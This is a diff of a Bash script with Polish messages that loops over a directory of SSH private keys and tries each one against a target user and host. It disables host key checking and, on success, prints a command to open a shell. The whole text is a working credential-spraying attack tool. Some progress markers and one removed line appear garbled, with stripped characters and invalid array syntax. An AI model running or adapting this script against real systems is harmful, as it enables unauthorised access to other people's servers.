@@ -25,27 +25,24 @@ fi
 
 echo "[] Target: $USER@$TARGET"
 echo "[] Klucze do sprawdzenia: $TOTAL"
+
 SSH_OPTS=(-o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5)
 
 HIT=""
-INDEX=0
-for key in "${KEYS[@]}"; do
-((INDEX++))
+for ((i=0; i<TOTAL; i++)); do
+key="${KEYS[$i]}"
 chmod 600 "$key" 2>/dev/null || true
-printf "\r[*] [%d/%d] %s" "$INDEX" "$TOTAL" "$(basename "$key")"
+printf "\r[] [%d/%d] %s" "$((i+1))" "$TOTAL" "$(basename "$key")"
 if ssh -i "$key" "${SSH_OPTS[@]}" "$USER@$TARGET" true &>/dev/null; then
 HIT="$key"
 echo
 echo "[+] Trafienie: $HIT"
-break
+echo "[] Uruchom powłokę:"
+echo "ssh -i "$HIT" ${SSH_OPTS[*]} $USER@$TARGET"
+exit 0
 fi
 done
+
 echo
-
-if [[ -z "$HIT" ]]; then
-echo "[-] Brak trafienia po sprawdzeniu $TOTAL kluczy."
+echo "[-] Brak dopasowania po sprawdzeniu $TOTAL kluczy w: $KEYDIR"
 exit 5
-fi
-
-echo "[] Uruchom powłokę:"
-echo "ssh -i "$HIT" ${SSH_OPTS[]} $USER@$TARGET"
